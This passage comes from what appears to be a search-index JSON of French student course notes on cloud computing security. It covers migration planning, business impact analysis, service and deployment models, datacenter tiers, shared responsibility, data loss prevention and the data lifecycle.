achet\u00e9es)(materiel / immateriel) 3) Recencer tous les besoins (de quoi l'entreprise a besoin) a) \u00e9changer avec les cadres (ton service utilise quoi ? les besoins ?) b) \u00e9changer avec les salari\u00e9s (pas la m\u00eame vision que les cadres) c) \u00e9changer avec les clients (temps de paiements, comment \u00e7a se passe avec l'entreprise ?) d) Volum\u00e9trie moyenne du r\u00e9seau => s\u00e9parer les flux e) Inventaire logiciel / materiel f) Inventaire des donn\u00e9es compatbles g) Inventaire des assurances (voir si les contrats sont toujours valides avec le cloud) h) Les donn\u00e9es personnelles (RGPD) c'est le cadre qui encadre le service qu'il g\u00e8re qui g\u00e8re les donn\u00e9es personnelles des employ\u00e9s. i) Analyser l'impact juridique. BIA Business Impact Analysis : Etude de l'impact sur la productivit\u00e9 de l'entreprise si un processus m\u00e9tier ou un \u00e9quipement/bien sur lequel repose le processus venait \u00e0 faillir. => Etablir les chemins critiques : les processus que l'on ne pourra pas interrompre. => Evaluer l'impact \u00e9conomique en cas de rupture du process. (la hotline on s'en fou peut etre pas mal) => Co\u00fbt de mise en conformit\u00e9 Co\u00fbt R\u00e9duction de la masse salariale. R\u00e9duction co\u00fbt op\u00e9rations. R\u00e9duction des co\u00fbts de mise en conformit\u00e9. Mod\u00e8le \u00e9conomique : SaaS : Sofware as a Service : emails, CRM, soft tout pr\u00eat cl\u00e9 en main. IaaS : Infrastructure as a Service : serveur baremetal POSITIFS : Garde la main sur la s\u00e9curit\u00e9. Tr\u00e8s utilis\u00e9 pour la sauvegarde de donn\u00e9e. PRA / PCA (plan de secours, plan de restauration). Tr\u00e8s forte disponibilit\u00e9. NEGATIFS : administration mises \u00e0 jour gain cloud minime PaaS : Platform as a Service : syst\u00e8me exploitation tout pr\u00eat (instance) IaaS + install les mises \u00e0 jour des OS POSITIFS : devops NEGATIFS : manque de visibilit\u00e9 sur l'hardening difficult\u00e9 \u00e0 modifier param\u00e8tre bloqu\u00e9s Mode de d\u00e9ployement : Cloud partag\u00e9 : \u00e9quipement poss\u00e9d\u00e9s par le fournisseur Partag\u00e9 entre tous les clients Cloud priv\u00e9 : L'infrastructure d'une enteprise R\u00e9seau d\u00e9di\u00e9 Serivces accessible depuis l'exterieur de l'entreprise (VPN, DMZ, frontal, etc) Ne sert qu'\u00e0 l'enterprise /!\\ Pas forcement dans les locaux /!\\ Cloud communautaire : Entreprise se regroupant pour former un cloud commun Souvent des associations owncloud / nextcloud Mod\u00e8le hybride : mix 2 type de cloud Type de datacenter T1 : - alimentation electrique secours pour serveur/sauvegarde => onduleurs - Coupure plus longue : g\u00e9n\u00e9rateur tenant jusqu'\u00e0 12h - Syst\u00e8me sp\u00e9cifique de refroidissement des syst\u00e8mes critique. - Espace d\u00e9di\u00e9 aux serveur - Espace d\u00e9di\u00e9 au r\u00e9seau T2 : (T1 am\u00e9lior\u00e9) - Redondance des serveurs et r\u00e9seaux - Erreurs de manipulation : l'arr\u00eat du service n'est pas syst\u00e9matique - En cas de maintenance planifi\u00e9e : pas de coupure de service T3 : (T2 am\u00e9lior\u00e9) - Tous les \u00e9quipements \u00e9lectroniques ont un syst\u00e8me d'alim \u00e9lectrique redondante. - Les op\u00e9rations essentielles continuent en cas de panne d'un composant. T4 : la cr\u00eame de la cr\u00eame - Tout est redondant (fil \u00e9lectrique, reseau, ordi, etc) La panne d'un syst\u00e8me n'a pas de cons\u00e9quence sur les services. Les \u00e9volutions techniques ne causent pas d'arr\u00eat technique. Quelques outils Netflix pour foutre le bordel Chaos Monkey Doctor Monkey Lattency Monkey => Simian Army Les types de biens Materiel Immateriel Processus Chemin critique Salari\u00e9s Processus Dans tous service, peut y avoir des processsus critiques. SPOF => single Point Of Faillure, viendra principalement du mat\u00e9riel ou des employ\u00e9s Fronti\u00e8re du cloud Dans un cloud public, les responsabilit\u00e9s sont r\u00e9parties entre le client et le cloud. Il existe une zone grise dans laquelle on ne sait pas trop qui est responsable : N\u00e9gociations N\u00e9gocier avec le fournisseur, comment etre s\u00fbr qu'un employ\u00e9 n'ira pas brancher un keylogger ? Exiger les mises \u00e0 jour des CVEs critiques. Chiffrement de disques durs. DLP Data Lost Prevention, syst\u00e8me de sauvegarde, pr\u00e9vention de la fuite de donn\u00e9e. Va alerter si un utilisateur exfiltre des donn\u00e9es (IA). Il y a une phase d'apprentissage, se base sur l'usage moyen d'un utilisateur sur un soft. Cycle de vie d'une donn\u00e9e 1) Cr\u00e9ation de la donn\u00e9e (m\u00e9moire vive, HDD, variable)(elle peut ne pas \u00eatre encore stock\u00e9e) 2) Utilisation de la donn\u00e9e 3) Stockage 4) Partage 5) Archivage (dur\u00e9e de vie, \u00e0 un moment cette donn\u00e9e devient moins utile voir plus du tout environ 5 ans) 6) Destruction","title":"Cours"},{"location":"securit\u00e9_IOT/cours/#cloud-computing","text":"","title":"Cloud computing"},{"location":"securit\u00e9_IOT/cours/#definition","text":"D\u00e9finition du NIST : Mod\u00e8le omnipr\u00e9sent Adapt\u00e9 aux besoins Disponible \u00e0 la demande Utilise des r\u00e9seaux Acc\u00e9der \u00e0 des moyens informatiques, partag\u00e9s, configurable Les moyens informatique peuvent \u00eatre r\u00e9serv\u00e9s et lib\u00e9r\u00e9s en fonction des besoins AVEC un effort minimal de configuration","title":"Definition"},{"location":"securit\u00e9_IOT/cours/#facturation","text":"T\u00e9l\u00e9m\u00e9trie , le prix est calcul\u00e9 sur beaucoup d'aspect : Utilisation CPU Stockage etc","title":"Facturation"},{"location":"securit\u00e9_IOT/cours/#raison-pour-aller-dans-le-cloud","text":"","title":"Raison pour aller dans le cloud ?"},{"location":"securit\u00e9_IOT/cours/#economique","text":"Pour toutes les entreprises, le service info est un centre de co\u00fbt, pas de profit. Mais le cloud est piegeux, les co\u00fbts grimpent vite ! Mais alors au top niveau infra","title":"Economique"},{"location":"securit\u00e9_IOT/cours/#securite","text":"Les informaticiens ne sont pas toujours amis avec la s\u00e9curit\u00e9, ma\u00eetrise pas toujours le concept, les outils, etc... Entre attaquer une infra d'un PME ou AWS/OVH/etc c'est pas pareil.","title":"Securit\u00e9"},{"location":"securit\u00e9_IOT/cours/#migrer-dans-le-cloud","text":"1) Recencer tous les processus de l'entreprise => BPL (graph simple et comprehensible par lambda) 2) Recencer tous les biens (assessments, les choses achet\u00e9es)(materiel / immateriel) 3) Recencer tous les besoins (de quoi l'entreprise a besoin) a) \u00e9changer avec les cadres (ton service utilise quoi ? les besoins ?) b) \u00e9changer avec les salari\u00e9s (pas la m\u00eame vision que les cadres) c) \u00e9changer avec les clients (temps de paiements, comment \u00e7a se passe avec l'entreprise ?) d) Volum\u00e9trie moyenne du r\u00e9seau => s\u00e9parer les flux e) Inventaire logiciel / materiel f) Inventaire des donn\u00e9es compatbles g) Inventaire des assurances (voir si les contrats sont toujours valides avec le cloud) h) Les donn\u00e9es personnelles (RGPD) c'est le cadre qui encadre le service qu'il g\u00e8re qui g\u00e8re les donn\u00e9es personnelles des employ\u00e9s. i) Analyser l'impact juridique.","title":"Migrer dans le cloud"},{"location":"securit\u00e9_IOT/cours/#bia","text":"Business Impact Analysis : Etude de l'impact sur la productivit\u00e9 de l'entreprise si un processus m\u00e9tier ou un \u00e9quipement/bien sur lequel repose le processus venait \u00e0 faillir. => Etablir les chemins critiques : les processus que l'on ne pourra pas interrompre. => Evaluer l'impact \u00e9conomique en cas de rupture du process. (la hotline on s'en fou peut etre pas mal) => Co\u00fbt de mise en conformit\u00e9","title":"BIA"},{"location":"securit\u00e9_IOT/cours/#cout","text":"R\u00e9duction de la masse salariale. R\u00e9duction co\u00fbt op\u00e9rations. R\u00e9duction des co\u00fbts de mise en conformit\u00e9.","title":"Co\u00fbt"},{"location":"securit\u00e9_IOT/cours/#modele-economique","text":"SaaS : Sofware as a Service : emails, CRM, soft tout pr\u00eat cl\u00e9 en main. IaaS : Infrastructure as a Service : serveur baremetal POSITIFS : Garde la main sur la s\u00e9curit\u00e9. Tr\u00e8s utilis\u00e9 pour la sauvegarde de donn\u00e9e. PRA / PCA (plan de secours, plan de restauration). Tr\u00e8s forte disponibilit\u00e9. NEGATIFS : administration mises \u00e0 jour gain cloud minime PaaS : Platform as a Service : syst\u00e8me exploitation tout pr\u00eat (instance) IaaS + install les mises \u00e0 jour des OS POSITIFS : devops NEGATIFS : manque de visibilit\u00e9 sur l'hardening difficult\u00e9 \u00e0 modifier param\u00e8tre bloqu\u00e9s","title":"Mod\u00e8le \u00e9conomique :"},{"location":"securit\u00e9_IOT/cours/#mode-de-deployement","text":"Cloud partag\u00e9 : \u00e9quipement poss\u00e9d\u00e9s par le fournisseur Partag\u00e9 entre tous les clients Cloud priv\u00e9 : L'infrastructure d'une enteprise R\u00e9seau d\u00e9di\u00e9 Serivces accessible depuis l'exterieur de l'entreprise (VPN, DMZ, frontal, etc) Ne sert qu'\u00e0 l'enterprise /!\\ Pas forcement dans les locaux /!\\ Cloud communautaire : Entreprise se regroupant pour former un cloud commun Souvent des associations owncloud / nextcloud Mod\u00e8le hybride : mix 2 type de cloud","title":"Mode de d\u00e9ployement :"},{"location":"securit\u00e9_IOT/cours/#type-de-datacenter","text":"T1 : - alimentation electrique secours pour serveur/sauvegarde => onduleurs - Coupure plus longue : g\u00e9n\u00e9rateur tenant jusqu'\u00e0 12h - Syst\u00e8me sp\u00e9cifique de refroidissement des syst\u00e8mes critique. - Espace d\u00e9di\u00e9 aux serveur - Espace d\u00e9di\u00e9 au r\u00e9seau T2 : (T1 am\u00e9lior\u00e9) - Redondance des serveurs et r\u00e9seaux - Erreurs de manipulation : l'arr\u00eat du service n'est pas syst\u00e9matique - En cas de maintenance planifi\u00e9e : pas de coupure de service T3 : (T2 am\u00e9lior\u00e9) - Tous les \u00e9quipements \u00e9lectroniques ont un syst\u00e8me d'alim \u00e9lectrique redondante. - Les op\u00e9rations essentielles continuent en cas de panne d'un composant. T4 : la cr\u00eame de la cr\u00eame - Tout est redondant (fil \u00e9lectrique, reseau, ordi, etc) La panne d'un syst\u00e8me n'a pas de cons\u00e9quence sur les services. Les \u00e9volutions techniques ne causent pas d'arr\u00eat technique.","title":"Type de datacenter"},{"location":"securit\u00e9_IOT/cours/#quelques-outils-netflix-pour-foutre-le-bordel","text":"Chaos Monkey Doctor Monkey Lattency Monkey => Simian Army","title":"Quelques outils Netflix pour foutre le bordel"},{"location":"securit\u00e9_IOT/cours/#les-types-de-biens","text":"Materiel Immateriel Processus Chemin critique Salari\u00e9s","title":"Les types de biens"},{"location":"securit\u00e9_IOT/cours/#processus","text":"Dans tous service, peut y avoir des processsus critiques. SPOF => single Point Of Faillure, viendra principalement du mat\u00e9riel ou des employ\u00e9s","title":"Processus"},{"location":"securit\u00e9_IOT/cours/#frontiere-du-cloud","text":"Dans un cloud public, les responsabilit\u00e9s sont r\u00e9parties entre le client et le cloud. Il existe une zone grise dans laquelle on ne sait pas trop qui est responsable :","title":"Fronti\u00e8re du cloud"},{"location":"securit\u00e9_IOT/cours/#negociations","text":"N\u00e9gocier avec le fournisseur, comment etre s\u00fbr qu'un employ\u00e9 n'ira pas brancher un keylogger ? Exiger les mises \u00e0 jour des CVEs critiques. Chiffrement de disques durs.","title":"N\u00e9gociations"},{"location":"securit\u00e9_IOT/cours/#dlp","text":"Data Lost Prevention, syst\u00e8me de sauvegarde, pr\u00e9vention de la fuite de donn\u00e9e. Va alerter si un utilisateur exfiltre des donn\u00e9es (IA). Il y a une phase d'apprentissage, se base sur l'usage moyen d'un utilisateur sur un soft.","title":"DLP"},{"location":"securit\u00e9_IOT/cours/#cycle-de-vie-dune-donnee","text":"1) Cr\u00e9ation de la donn\u00e9e (m\u00e9moire vive, HDD, variable)(elle peut ne pas \u00eatre encore stock\u00e9e) 2) Utilisation de la donn\u00e9e 3) Stockage 4) Partage 5) Archivage (dur\u00e9e de vie, \u00e0 un moment cette donn\u00e9e devient moins utile voir plus du tout environ 5 ans) 6) Destruction","title":"Cycle de vie d'une donn\u00e9e"}]}